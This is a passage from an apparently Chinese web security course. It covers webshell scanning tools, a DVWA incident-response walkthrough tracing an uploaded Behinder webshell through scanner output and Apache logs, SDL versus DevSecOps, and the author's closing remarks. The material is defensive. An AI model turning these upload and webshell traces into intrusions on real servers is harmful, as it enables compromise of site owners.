<img src="./images/Cgp9HWAqXW2AaS4sAB64Um8gdIs285.png" alt="Cgp9HWAqXW2AaS4sAB64Um8gdIs285.png" width="80%">

</figure>

<p>
牧云
</p>
</div>
</div>
<div id="outline-container-php-malware-finder" class="outline-4">
<h4 id="php-malware-finder">3.<a href="https://github.com/jvoisin/php-malware-finder">PHP Malware Finder</a></h4>
<div class="outline-text-4" id="text-php-malware-finder">
<p>
PHP Malware Finder 是一款基于 yara 规则检测 Webshell 和恶意软件混淆代
码的工具，在检测一些混淆编码的 Webshell 时比较有效。
</p>

<p>
使用如下命令来扫描指定目录以检测是否存在恶意的 Webshell：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">./phpmalwarefinder  [-cfhtv] [-l (php|asp)] &lt;file|folder&gt; 
yara -r ./php.yar /var/www
</pre>
</div>
</div>
</div>
<div id="outline-container-d-盾" class="outline-4">
<h4 id="d-盾">4.<a href="http://www.d99net.net/">D 盾</a></h4>
<div class="outline-text-4" id="text-d-盾">
<p>
D 盾是 Windows 平台上的 Web 防火墙，但它也支持 Webshell 查杀。目前它仅
支持 Windows，是 Windows 上使用比较广泛的 Web 查杀软件；若Linux 系统也
需要用，可以拷贝文件到 Windows 上进行扫描，或者尝试使用Wine。
</p>


<figure id="org94edeea">
<img src="./images/Cgp9HWAqXYiAGKGXABBu6zfx9FY061.png" alt="Cgp9HWAqXYiAGKGXABBu6zfx9FY061.png" width="80%">

</figure>

<p>
D 盾 Web 查杀
</p>
</div>
</div>
<div id="outline-container-lorgapache-日志分析工具" class="outline-4">
<h4 id="lorgapache-日志分析工具">5.<a href="https://github.com/jensvoid/lorg">Lorg：Apache 日志分析工具</a></h4>
<div class="outline-text-4" id="text-lorgapache-日志分析工具">
<p>
Lorg 是一款 Apache 日志的安全分析工具，可以帮助你识别日志中潜在的 Web
漏洞攻击行为，便于你快速定位漏洞位置，支持多种常见 Web 漏洞类型的识别，
支持 html、json、xml、csv 多个格式的检测报告输出。
</p>

<p>
使用如下命令来指定访问日志路径进行分析：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">./lorg -d phpids -u -g /path/to/access_log
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-实例演示" class="outline-3">
<h3 id="实例演示">实例演示</h3>
<div class="outline-text-3" id="text-实例演示">
<p>
接下来，我们以<a href="#文件上传漏洞：种植服务器木马的捷径">《13 ​|文件上传漏洞：种植服务器木马的捷径》</a>的上传文件漏洞
为例，在利用漏洞上传Webshell完成入侵后，按照刚刚“应急处置流程”中讲解
的步骤，从防御者的角度来看如何应急响应。
</p>
</div>
<div id="outline-container-关闭外网进行排查-1" class="outline-4">
<h4 id="关闭外网进行排查-1">1.关闭外网进行排查</h4>
<div class="outline-text-4" id="text-关闭外网进行排查-1">
<p>
先关闭外网，然后登录服务器进行排查。先借助 Wappalyzer插件看下目标网站
的指纹信息，如下图所示，可以看到是 Apache、Ubuntu 与 PHP的环境，Apache
的网站目录通常位于/var/www/html，直接打开验证下就知道（DVWA 靶场也确实
位于此目录下）。
</p>


<figure id="org18543c7">
<img src="./images/Cgp9HWAqXZ-ABTXGAAJmjKlYcNU577.png" alt="Cgp9HWAqXZ-ABTXGAAJmjKlYcNU577.png" width="80%">

</figure>

<p>
DVWA 靶场网站指纹
</p>
</div>
</div>
<div id="outline-container-webshell-检测" class="outline-4">
<h4 id="webshell-检测">2.Webshell 检测</h4>
<div class="outline-text-4" id="text-webshell-检测">
<p>
接下来用河马对网站根目录进行 Webshell扫描，采用*深度扫描模式*，否则它
会扫描指定目录，而不会循环遍历目录扫描：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">root@346953e9d6e9:/# ./hm scan /var/www/html
                                 {1.8.2 hm#linux-amd64.24fbb40}
 __
|  |--.-----.--------.---.-.
|     |  -__|        |  _  |
|__|__|_____|__|__|__|___._|
                                 http://www.shellpub.com

[*] 扫描预处理 2021-02-12 08:13:18
[*] 开始扫描 2021-02-12 08:13:18
ERRO[0001] cloud invalid error: invalid character '&lt;' looking for beginning of value 
+------+----------+------+
| 类型 | 深度查杀 | 数量 |
+------+----------+------+
| 后门 |        0 |    0 |
| 疑似 |        0 |    0 |
+------+----------+------+
|          总计   |  0   |
+------+----------+------+
[*] 恭喜!没有发现网站后门,  请您继续保持!
</pre>
</div>

<p>
为什么扫不到呢？这是河马扫描机制的一个缺陷，因为 /var/www/html 是个指向
/app 的软链接：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">root@346953e9d6e9:/# ll /var/www/html
lrwxrwxrwx 1 root root 4 Feb 15  2016 /var/www/html -&gt; /app/
</pre>
</div>

<p>
所以应该直接扫描 /app 目录：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">root@346953e9d6e9:/# ./hm scan /app
                                 {1.8.2 hm#linux-amd64.24fbb40}
 __
|  |--.-----.--------.---.-.
|     |  -__|        |  _  |
|__|__|_____|__|__|__|___._|
                                 http://www.shellpub.com

[*] 扫描预处理 2021-02-12 08:16:21
[*] 开始扫描 2021-02-12 08:16:21
|----------| 0/584   0% [elapsed: 56.037µs left: 0s,  0.00 iters/sec]2021/02/12 08:16:22 
 cloud scan error: invalid character '&lt;' looking for beginning of value
ERRO[0002] cloud invalid error: invalid character '&lt;' looking for beginning of value 
+------+----------+------+
| 类型 | 深度查杀 | 数量 |
+------+----------+------+
| 后门 |        0 |    1 |
| 疑似 |        0 |    7 |
+------+----------+------+
|          总计   |  8   |
+------+----------+------+
[*] 详细结果已经保存到结果路径的result.csv文件中
|##########| 584/584 100% [elapsed: 1.000189195s left: 0s, 583.89 iters/sec]
</pre>
</div>

<p>
扫到一个后门，打开 result.csv 看下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">root@346953e9d6e9:/# cat result.csv 
序号,类型,路径
1,冰蝎3.0 PHP-PHP后门，建议清理,/app/hackable/uploads/shell.php
2,疑似PHP后门-建议人工确认,/app/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrDef/HTML/Color.php
3,疑似PHP后门-建议人工确认,/app/external/phpids/0.6/tests/IDS/MonitorTest.php
4,疑似PHP后门-建议人工确认,/app/vulnerabilities/exec/source/high.php
5,疑似PHP后门-建议人工确认,/app/vulnerabilities/exec/source/impossible.php
6,疑似PHP后门-建议人工确认,/app/vulnerabilities/exec/source/low.php
7,疑似PHP后门-建议人工确认,/app/vulnerabilities/exec/source/medium.php
8,疑似PHP后门-建议人工确认,/app/vulnerabilities/upload/help/help.php
</pre>
</div>

<p>
非常明确地识别出 /app/hackable/uploads/shell.php 是冰蝎Webshell，其他
一些疑似 PHP后门大多是存在漏洞的代码，在实际应用中，我们需要进一步去排
查这些疑似文件。
</p>
</div>
</div>
<div id="outline-container-web-日志分析-1" class="outline-4">
<h4 id="web-日志分析-1">3.Web 日志分析</h4>
<div class="outline-text-4" id="text-web-日志分析-1">
<p>
找到此shell.php，我们就可以通过分析日志去定位攻击者，主要还是用于回溯
攻击过程，因为攻击上传此shell.php 后一般都会去访问或执行其他操作。
</p>

<p>
Apache 日志位于 /var/log/apache2/access.log，先定位访问 shell.php 的IP
地址是 172.17.0.1。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">root@346953e9d6e9:/var/log/apache2# cat access.log|grep shell.php
172.17.0.1 - - [12/Feb/2021:07:45:51 +0000] "GET /hackable/uploads/shell.php HTTP/1.1" 404 516 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
172.17.0.1 - - [12/Feb/2021:07:45:55 +0000] "GET /hackable/uploads/shell.php HTTP/1.1" 404 515 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
......
172.17.0.1 - - [12/Feb/2021:08:13:35 +0000] "POST /hackable/uploads/shell.php HTTP/1.1" 200 3995 "-" "Mozilla/5.0 (iPod; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1"
172.17.0.1 - - [12/Feb/2021:08:20:35 +0000] "POST /hackable/uploads/shell.php HTTP/1.1" 200 4527 "-" "Mozilla/5.0 (iPod; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1"
</pre>
</div>
</div>
</div>
<div id="outline-container-漏洞定位与复现" class="outline-4">
<h4 id="漏洞定位与复现">4.漏洞定位与复现</h4>
<div class="outline-text-4" id="text-漏洞定位与复现">
<p>
从输出结果看，访问此 Webshell 的最早时间是 2021-02-12 07:45:51，再看下
此时间之间该攻击者还访问了哪些地址。
</p>

<div class="org-src-container">
<pre class="src src-sh">root@346953e9d6e9:/var/log/apache2# cat access.log|grep 172.17.0.1
172.17.0.1 - - [12/Feb/2021:07:43:03 +0000] <span style="color: #8b2252;">"GET / HTTP/1.1"</span> 302 385 <span style="color: #8b2252;">"-"</span> <span style="color: #8b2252;">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span>
172.17.0.1 - - [12/Feb/2021:07:43:03 +0000] <span style="color: #8b2252;">"GET /login.php HTTP/1.1"</span> 302 384 <span style="color: #8b2252;">"-"</span> <span style="color: #8b2252;">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span>
172.17.0.1 - - [12/Feb/2021:07:43:03 +0000] <span style="color: #8b2252;">"GET /setup.php HTTP/1.1"</span> 200 1822 <span style="color: #8b2252;">"-"</span> <span style="color: #8b2252;">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span>
......
172.17.0.1 - - [12/Feb/2021:07:43:42 +0000] <span style="color: #8b2252;">"GET /vulnerabilities/upload/ HTTP/1.1"</span> 200 1838 <span style="color: #8b2252;">"http://127.0.0.1:8081/index.php"</span> <span style="color: #8b2252;">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span>
......
172.17.0.1 - - [12/Feb/2021:07:45:51 +0000] <span style="color: #8b2252;">"GET /hackable/uploads/shell.php HTTP/1.1"</span> 404 516 <span style="color: #8b2252;">"-"</span> <span style="color: #8b2252;">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span>
</pre>
</div>

<p>
可以看到，攻击者在访问 shell.php 前 GET 请求/vulnerabilities/upload/
地址，直接构造链接去访问下<a href="http://127.0.0.1:8081/vulnerabilities/upload/">http://127.0.0.1/vulnerabilities/upload/</a>，上
传入口就显现出来了。
</p>


<figure id="org52441a5">
<img src="./images/CioPOWAqXbiAWYuWAAJ4HkYrP7A665.png" alt="CioPOWAqXbiAWYuWAAJ4HkYrP7A665.png" width="80%">

</figure>

<p>
上传页面
</p>

<p>
由此可以推测出攻击者可能是利用上传漏洞上传Webshell，从而控制服务器的，
我们可以重现下漏洞攻击过程，以验证前面的推测是否准确。
</p>

<blockquote>
<p>
关于文件上传漏洞的测试过程在《13 ​| 文件上传漏洞：种植服务器木马的捷径》已
经讲过，此处不再赘述。
</p>
</blockquote>
</div>
</div>
<div id="outline-container-清除与加固" class="outline-4">
<h4 id="清除与加固">5.清除与加固</h4>
<div class="outline-text-4" id="text-清除与加固">
<p>
接下来，我们就可以 <b>删除</b> /app/hackable/uploads/shell.php，同时 <b>排查</b>
下系统上是否还其他恶意程序，然后 <b>修复上传漏洞</b> 后再恢复网站。
</p>

<p>
此处演示中，我并没有留取 rootkit 或者前面内网渗透演示中的回连后门。你
可以在完成前面内网渗透操作后，按照本课程的思路去进一步排查，看能否自己
发现攻击者的渗透过程，并采取相应的安全解决方案。
</p>
</div>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
本节课主要介绍了网站入侵的检测方法，以及应急处理流程。
</p>

<p>
其中重点介绍 Webshell 查杀的方法和工具，并列举了一些在 Linux 平台下常
用的命令工具，用于排查系统上的可疑进程和文件，以确保一些后门的恶意程序
已被清除干净；否则单独补个漏洞，删除个 Webshell，并不能完全防止二次入
侵。
</p>

<p>
同时自己应注意做好数据备份，防止被恶意删除文件后无法恢复，造成严重的业
务经济损失。在用备份恢复数据时，注意提前入侵排查，建议提供备份好相关的
恶意文件，以留后续分析，防止有遗落的恶意行为和文件未被发现，同时为制作
相应的防御方案提供参考。
</p>
</div>
</div>
</section>
<section id="outline-container-h:36966594-9bb1-41d7-b90a-9e8f838615f7" class="outline-2">
<h2 id="h:36966594-9bb1-41d7-b90a-9e8f838615f7">研发安全：从 SDL 到 DevSecOps</h2>
<div class="outline-text-2" id="text-h:36966594-9bb1-41d7-b90a-9e8f838615f7">
<p>
近几年，国内外越来越多人开始提倡 DevSecOps 理念，很多企业也逐步从 SDL
切换到 DevSecOps，以便研发出更安全的系统。
</p>

<p>
此外，DevSecOps 的应用也非常广泛，适用于各种研发领域，并不仅限于本套课
程所讲的 Web 领域。所以，本讲就向你介绍下 SDL、DevSecOps 相关理论与实
践，并对其进行出对比，方便你能够清楚地理解它们之点的差异和价值。
</p>
</div>
<div id="outline-container-什么是-sdl" class="outline-3">
<h3 id="什么是-sdl">什么是 SDL？</h3>
<div class="outline-text-3" id="text-什么是-sdl">
<p>
SDL（安全开发生命周期）是一个满足安全合规要求的同时，兼顾开发成本的软
件开发过程。它由微软提出，旨在帮助开发人员构建更加安全的软件。
</p>

<p>
SDL的核心理念就是将*安全*集成到软件开发的每一个阶段，从需求（要求）、
设计、编码（实施）、测试、发布的每一阶段都应该加入相应的安全工作，以提
升软件安全质量。
</p>


<figure id="org94f26ed">
<img src="./images/Cgp9HWAuBCGAH1M5AAFGTV0f1u8829.png" alt="Cgp9HWAuBCGAH1M5AAFGTV0f1u8829.png" width="80%">

</figure>

<p>
SDL（安全开发生命周期）
</p>

<p>
如上图所示，早期对员工进行的安全培训，就已经是 SDL工作的一部分了；同时
遵循整个研发流程，即使是软件发布后，也应该建立一套完善的安全响应流程，
以应对发布后可能出现的安全事件。
</p>

<p>
不过，SDL也有不足，那就是它更强调安全人员的工作，而并未关注运维问题。
同时，现在企业越来越强调敏捷快速地开发产品，按SDL 的流程看，是比较难适
应这种快速迭代的研发流程的，从而促使了 DevSecOps的诞生。
</p>
</div>
</div>
<div id="outline-container-什么是-devsecops" class="outline-3">
<h3 id="什么是-devsecops">什么是 DevSecOps？</h3>
<div class="outline-text-3" id="text-什么是-devsecops">
<p>
提到 DevSecOps，就不得不先说下 DevOps 与开发模式。
</p>
</div>
<div id="outline-container-devops" class="outline-4">
<h4 id="devops">1. DevOps</h4>
<div class="outline-text-4" id="text-devops">
<p>
DevOps是“开发”与“运维”两词的缩写，它是一套最佳实践方法论，旨在软件
的开发生命周期中，促进IT专业人员（包括产品、开发、测试、运维等工作人员）
之间的协作和交流，最终实践 <b>持续集成</b> （CI，集成各个开发团队成员工作，
以及时地发现错误）、 <b>持续部署</b> （CD，保证快速且经常地发布）、 <b>持续反
馈</b> （收集相关反馈帮助优化产品）的目标。
</p>


<figure id="org2c14d1a">
<img src="./images/CioPOWAuBDCAcBMmAAeRQL4-nwo108.png" alt="CioPOWAuBDCAcBMmAAeRQL4-nwo108.png" width="80%">

</figure>

<p>
DevOps 过程
</p>
</div>
</div>
<div id="outline-container-devops-与其他开发模式的不同" class="outline-4">
<h4 id="devops-与其他开发模式的不同">2. DevOps 与其他开发模式的不同</h4>
<div class="outline-text-4" id="text-devops-与其他开发模式的不同">
<p>
开发模式重点介绍下瀑布式开发、敏捷开发与 DevOps 的对比，通过下图就可以
很直观地看出三者之间的差异。
</p>


<figure id="orgde025bb">
<img src="./images/Cgp9HWAuBD-AdNggAADeU2LQqws391.png" alt="Cgp9HWAuBD-AdNggAADeU2LQqws391.png" width="80%">

</figure>

<p>
各种开发模型对比
</p>

<p>
可以看到从瀑布式开发到敏捷开发，再从敏捷开发到DevOps，可以看到各个阶段
的切换速度越来越快，且以前的运维部署工作都是放到最后的。而DevOps则结合
敏捷开发思想，将部署工作也敏捷起来，更强调自动化工具的实现与应用，以帮
助实现软件的快速迭代。
</p>
</div>
</div>
<div id="outline-container-devsecops-强调安全" class="outline-4">
<h4 id="devsecops-强调安全">3.DevSecOps 强调安全</h4>
<div class="outline-text-4" id="text-devsecops-强调安全">
<p>
<b>DevSecOps 正是在 DevOps的 CI/CD过程中嵌入安全工作，整合开发、安全、运
维等各项工作</b> ，强调安全是整个 IT团队（开发、安全、运维等工作人员）的
责任，而不仅仅是安全人员的工作，且需要贯穿整个研发生命周期的每一个环节，
如下图所示。
</p>


<figure id="org58943c7">
<img src="./images/Cgp9HWAuBE2AdTREAAUyA7ehkaA210.png" alt="Cgp9HWAuBE2AdTREAAUyA7ehkaA210.png" width="80%">

</figure>

<p>
DevSecOps 流程
</p>
</div>
</div>
</div>
<div id="outline-container-sdl-与-devsecops-的对比" class="outline-3">
<h3 id="sdl-与-devsecops-的对比">SDL 与 DevSecOps 的对比</h3>
<div class="outline-text-3" id="text-sdl-与-devsecops-的对比">
<p>
SDL 与 DevSecOps 并不冲突，一些安全工作是相同的，*只是 DevSecOps更进一
步强调自动化融入流程，安全责任属于每个人*，自建更适合自己企业的安全文
化。
</p>

<p>
下面我整理出 SDL 与 DevSecOps 的一些对比，以帮助你更好地理解它们。
</p>


<figure id="org91e1469">
<img src="./images/Cgp9HWAuBHSAHqHOAADU4OCrhvM183.png" alt="Cgp9HWAuBHSAHqHOAADU4OCrhvM183.png" width="80%">

</figure>
</div>
</div>
<div id="outline-container-devsecops-工具链及其建设实践" class="outline-3">
<h3 id="devsecops-工具链及其建设实践">DevSecOps 工具链及其建设实践</h3>
<div class="outline-text-3" id="text-devsecops-工具链及其建设实践">
<p>
如下图所示，Gartner 曾给出一套 DevSecOps 工具链，从计划、创建，到发布、
预防，再到预测、适应，共包括了 10个环节，接下来我们来看看每个环节中的
实践建议。
</p>


<figure id="org6560004">
<img src="./images/Cgp9HWAuBIWAHtwaAAUVTKLJymM985.png" alt="Cgp9HWAuBIWAHtwaAAUVTKLJymM985.png" width="100%">

</figure>

<p>
DevSecOps 工具链
</p>
</div>
<div id="outline-container-计划plan" class="outline-4">
<h4 id="计划plan">1.计划（Plan）</h4>
<div class="outline-text-4" id="text-计划plan">
<ul class="org-ul">
<li>在研发的早期，安全人员可以先给相关人员做 <b>安全培训</b> ，开设一些安全相
关课程，在公司内部不定期地开展培训；</li>

<li>同时安全人员可制定相应的公司级 <b>安全规范</b> ，包括各种语言的代码安全规
范、服务器安全加固规范等等，以引导相关人员在将需求设计阶段就将安全考
虑在内，并在后续的研发和运维中起参考作用，可以有效地避免一些常见的安
全问题；</li>

<li>同时，可邀请安全团队对需求做 <b>安全评估</b> ，包括威胁建模等相关工作，以
尽早地发现安全问题，避免开发后再修改，浪费开发资源。</li>
</ul>
</div>
</div>
<div id="outline-container-创建create" class="outline-4">
<h4 id="创建create">2.创建（Create）</h4>
<div class="outline-text-4" id="text-创建create">
<p>
在前面的漏洞攻防部分，修复漏洞时曾介绍过一些 <b>安全开发库</b> ，这些也是此
阶段的应用实践部分。
</p>

<p>
还有一些现在流行的 IDE 集成开发环境中的代码 <b>安全检测插件</b> 。如下图所
示，比如最近陌陌开源的 Java 代码安全审计插件<a href="https://github.com/momosecurity/momo-code-sec-inspector-java">Momo Code Sec Inspector</a>，
用于检测 Java 代码漏洞，并提供一些常见漏洞的修复代码自动生成功能；除了
自动化，也可以在企业内部推广代码评审，通过评审后再合并代码。
</p>


<figure id="orgb5d74bc">
<img src="./images/CioPOWAuBQ6AH64LAAWKuEUqGec581.png" alt="CioPOWAuBQ6AH64LAAWKuEUqGec581.png" width="80%">

</figure>

<p>
Momo Code Sec Inspector（Java）
</p>
</div>
</div>
<div id="outline-container-验证verify" class="outline-4">
<h4 id="验证verify">3.验证（Verify）</h4>
<div class="outline-text-4" id="text-验证verify">
<p>
验证测试是安全检测中不可缺少的部分，目前已经衍生出SAST（静态应用程序安
全测试）、DAST（动态应用程序安全测试）、IAST（交互式应用程序安全测试）、
SCA（软件成分分析）等安全测试技术。
</p>

<blockquote>
<p>
SAST、DAST 和 IAST在<a href="#SQL 注入：漏洞的检测与防御">《08 ​| SQL注入：漏洞的检测与防御》</a>中已经介绍过，此
处不再赘述。
</p>
</blockquote>

<p>
这里聊下 SCA ，它主要用于被利用的各类组件、库代码的安全问题，如果是一
些存在已知漏洞的代码被引用，就会影响产品的正常运行。所以在使用前，需要
对其进行检测，有时这部分检测也会放在 SAST 中，因为它也涉及静态代码分析。
</p>
</div>
</div>
<div id="outline-container-预发布preprod" class="outline-4">
<h4 id="预发布preprod">4.预发布（Preprod）</h4>
<div class="outline-text-4" id="text-预发布preprod">
<p>
在前面的验证环节中使用的方法也会应用在预发布中，比如将 SAST、DAST、
IAST、SCA 等技术应用到集成测试中；同时也会应用混沌工程去人为制造各种故
障，以验证系统在应对故障的情况下，能否稳定持续地提供正常服务；以及使用
Fuzzing 模糊测试技术去构造一些随机数据，发送给程序进行解析处理，通过检
测是否触发异常（比如内存崩溃）来判断是否存在安全漏洞。
</p>

<p>
一些加固壳等安全加固方案也是提高代码安全的一种方式，提高逆向破解成本，
在一定程度上也能防止遭受安全攻击。
</p>
</div>
</div>
<div id="outline-container-发布release" class="outline-4">
<h4 id="发布release">5.发布（Release）</h4>
<div class="outline-text-4" id="text-发布release">
<p>
此阶段主要是应用软件签名来识别软件是由哪家企业开发的，同时区别一些重打
包的篡改软件，这能在一定程度上区分软件的可靠性。
</p>
</div>
</div>
<div id="outline-container-预防prevent" class="outline-4">
<h4 id="预防prevent">6.预防（Prevent）</h4>
<div class="outline-text-4" id="text-预防prevent">
<p>
采用签名验证、完整性检查等手段来验证应用和数据是否被篡改过，防止由于判
断失误从而做出不符合预期的行为；同时采取“纵深防御”的思路，设置多层安
全措施和机制，防止单层防御被直接突破，可有效提高攻击成本，这是安全建设
工作中常用的一种手段。
</p>
</div>
</div>
<div id="outline-container-检测detect" class="outline-4">
<h4 id="检测detect">7.检测（Detect）</h4>
<div class="outline-text-4" id="text-检测detect">
<p>
运行时应用自我保护（RASP，Runtime ApplicationSelf-Protection）在<a href="#SQL 注入：漏洞的检测与防御">《08 ​|SQL注入：漏洞的检测与防御》</a>中介绍过，它通过实时监控、检测与阻断安全攻击，使得应用程序具备自我保护能力。
</p>

<blockquote>
<p>
国内比较知名的开源项目就是百度的 OpenRASP。
</p>
</blockquote>

<p>
Gartner 还创建一个新词叫 UEBA（User and Entity Behavior Analytics，用
户和实体行为分析），即通过对用户和系统实体在数据层面的异常行为，利用机
器学习的方法来发现网络安全、IT 办公安全、内外部的业务安全等风险，如数
据泄露、入侵、内部滥用等的安全问题。像一些业务安全中常应用到的风险控制
策略，也正属于此。
</p>

<p>
产品上线后，对其进行漏洞扫描，所以一些 SAST、DAST、IAST 技术又可以派上
用场了，包括 Web 漏洞扫描器、移动应用漏洞扫描系统、主机入侵检测系统、
流量安全分析系统等工具都属于此阶段。
</p>

<p>
国内流行的红蓝军对抗的演习、渗透测试也是对系统进行有效安全检测的方式，
能够避免闭门造车，以及其他过于主观的判断，只有经得起安全考验的系统才是
安全的系统。
</p>
</div>
</div>
<div id="outline-container-响应respond" class="outline-4">
<h4 id="响应respond">8.响应（Respond）</h4>
<div class="outline-text-4" id="text-响应respond">
<p>
RASP 既属于检测环节，也属于响应环节，因为它既有检测能力，也有阻断能力。
</p>

<p>
​<b>安全编排自动化响应（SOAR）</b> 是 Gartner 提出的概念，用于帮助快速实现安
全应急响应工作，通过采集各种检测数据，对其进行分析，然后自动化定义、排
序和驱动执行应对安全事件的响应工作。
</p>

<p>
如下图所示，开源的 SOAR有<a href="https://github.com/zbnio/zbn">织布鸟</a>、<a href="https://github.com/nsacyber/WALKOFF">Walkoff</a>。
</p>


<figure id="orga39eea2">
<img src="./images/CioPOWAuBKWAMCPPAAEy9c7nh_Y846.png" alt="CioPOWAuBKWAMCPPAAEy9c7nh_Y846.png" width="80%">

</figure>

<p>
织布鸟 SOAR 系统
</p>


<figure id="org6627d60">
<img src="./images/CioPOWAuBLKAMaRdAAFXXPl7Ogg107.png" alt="CioPOWAuBLKAMaRdAAFXXPl7Ogg107.png" width="80%">

</figure>

<p>
Walkoff SOAR
</p>

<p>
WAF、DDOS防御系统等传统的安全防御系统在对一些恶意请求时，能够做出拦截
阻断的响应，发挥安全防御作用。
</p>

<p>
这几年国内流行建立 <b>SRC应急响应平台</b> ，通过奖励机制去收集产品漏洞，帮
助企业完善自身的检测与防御系统，同时提高产品的安全性。这种奖励外部的响
应方法非常有效，企业建议专门的应急响应团队也有助于第一时间响应安全事件，
降低或消除事件带来的负面影响。
</p>
</div>
</div>
<div id="outline-container-预测predict" class="outline-4">
<h4 id="预测predict">9.预测（Predict）</h4>
<div class="outline-text-4" id="text-预测predict">
<p>
通过监控外部情报，收集与整理出相关安全威胁信息，帮助内部一些检测与防御
系统增加和优化规则。比如外部曝光一款主流应用的高危漏洞，我们就可能及时
感知到，并进行漏洞分析，从而添加相应的检测与拦截规则，去提前做好防御工
作。
</p>
</div>
</div>
<div id="outline-container-适应adapt" class="outline-4">
<h4 id="适应adapt">10.适应（Adapt）</h4>
<div class="outline-text-4" id="text-适应adapt">
<p>
基于前面的威胁情报、外部报告漏洞、红蓝军对抗等诸多手段去发现内部安全与
检测系统的不足，不断地复盘优化检测与防御规则，优化应急响应流程，从而提
升自身安全风险的管控能力。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
本节课重点介绍 SDL 与 DevSecOps 的相关概念与技术，并做了对比，然后详细
介绍了 DevSecOps 各个环节所涉及的相关技术和工具。
</p>

<p>
综上可以看出，想建立一套完整的 DevSecOps 实践流程，其所涉及的工作范围、
流程、工具都非常繁多，非一人之力所能完成，甚至不是单纯一两个小团队能够
完成的，本身它就是提倡多工种协同建设安全工作，而不是安全仅由安全人员来
背锅。
</p>

<p>
只有不断地实践、探索、优化 DevSecOps 模式，不断地改进相关工具链，不断
地提供更加自动化、更加便捷的安全能力，才能够提高整体的安全能力，做好安
全风险管控工作。
</p>


<figure id="org7645ecb">
<img src="./images/CioPOWAuCxOAcc6YAAVgr8YKbVY942.png" alt="CioPOWAuCxOAcc6YAAVgr8YKbVY942.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:26ff2ff7-9a23-47bb-9b2a-4d2465e35e43" class="outline-2">
<h2 id="h:26ff2ff7-9a23-47bb-9b2a-4d2465e35e43">结束语   谈谈我的安全观</h2>
<div class="outline-text-2" id="text-h:26ff2ff7-9a23-47bb-9b2a-4d2465e35e43">
<p>
《Web 安全攻防之道》自 2020 年 11 月开始写，至现在，已历经 3个多月，在
这里正式地向你说一声“再见”，同时也感谢你一路的陪伴，希望这个专栏的内
容能让你有所收获。
</p>

<p>
这是我第一次写专栏课程，之前编辑联系我时，我一开始也不知道写什么，毕竟
与平时写公众号文章不一样。之前想写啥就写啥，而课程需要系统化地设计，相
对比较连贯、完整。写作期间，编辑们也经常帮助我修改文辞、设计图表，在此
一并感谢。
</p>

<p>
庆幸的是，结局不算差。最后，聊聊我的安全观，以作本次课程的结束语。
</p>
</div>
<div id="outline-container-武德与技艺" class="outline-3">
<h3 id="武德与技艺">武德与技艺</h3>
<div class="outline-text-3" id="text-武德与技艺">
<p>
俗话说“学艺先做人”，一颗善良的心比技术本身更重要。
</p>

<p>
早几年，年轻时春节回乡，见过一些搞黑产的同学，每年几百万收入。而自己寒
窗苦读十余年，工作奋斗多年，却不如一个初中毕业的。
</p>

<p>
但是后来自己释怀了，“君子爱财，取之有道”，自己正道获取的才有成就感，
才真正拿得住，而对方所拥有的一切并不长久。
</p>

<p>
曾见过一些人入行几个月后，就去搞黑产，在网上晒豪车，晒比基尼派对；而再
过个一年，人进去了，一切如梦幻一般；还有的人躲在国外，春节都回不了家，
虽然很有钱，但老婆孩子都几年没见面了，过着有钱而不幸福的日子。
</p>

<p>
<b>所以，对于想进入安全行业的人，奉劝一句：不要搞黑产！</b>
</p>
</div>
</div>
<div id="outline-container-个人与行业" class="outline-3">
<h3 id="个人与行业">个人与行业</h3>
<div class="outline-text-3" id="text-个人与行业">
<p>
以前在 QQ或者安全论坛上经常会看到“拜师贴”，现在知乎上又常见到有人问
如何进入安全行业，或者认识到很厉害的黑客。
</p>

<p>
<b>如果你足够优秀，行业会自动接纳你。</b>
</p>

<p>
无论是学习还是工作，总期冀有人手把手教，有人一路带着飞，那几乎是不可能
的，没有谁有这个义务和责任，更没这个时间。
</p>

<p>
当然，如果你不做技术，也可以进入安全行业，比如HR、猎头等等，他们也常混
迹于安全圈，对行业非常了解，人脉也很广。
</p>
</div>
</div>
<div id="outline-container-局部与整体" class="outline-3">
<h3 id="局部与整体">局部与整体</h3>
<div class="outline-text-3" id="text-局部与整体">
<p>
有次在外面开会，一会新闻记者问我“微信到底安不安全？”当时我回答：微信
安全与否，不仅仅是由自身App决定，还受手机系统环境影响。比如利用系统漏
洞窃取微信聊天内容，以及其他人为疏忽的原因，如密码泄露给他人，手机掉了
且未锁屏等。
</p>

<p>
<b>而看待安全问题，需要从整体考虑出发。</b>
</p>

<p>
这就如下图所示的抽屉，单纯锁一个抽屉，对它而言看似安全，但从另一个未锁
